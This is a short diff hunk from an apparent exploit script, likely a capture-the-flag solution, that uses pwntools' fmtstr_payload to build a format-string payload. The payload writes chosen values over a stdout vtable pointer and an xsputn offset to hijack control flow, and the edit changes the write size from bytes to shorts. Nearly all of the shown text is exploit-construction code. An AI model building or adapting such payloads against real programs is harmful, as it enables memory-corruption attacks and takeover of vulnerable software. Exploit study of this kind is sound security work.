@@ -10,7 +10,7 @@ def main():
         base + xsputn_offset: 0x4b95d8,
         stdout_vtable_addr + 1: 0x6cd0
     }
-    payload = fmtstr_payload(offset=6, writes = writes, write_size='byte')
+    payload = fmtstr_payload(offset=6, writes = writes, write_size='short')
     print(hexdump(payload))
 
 if __name__ == "__main__":
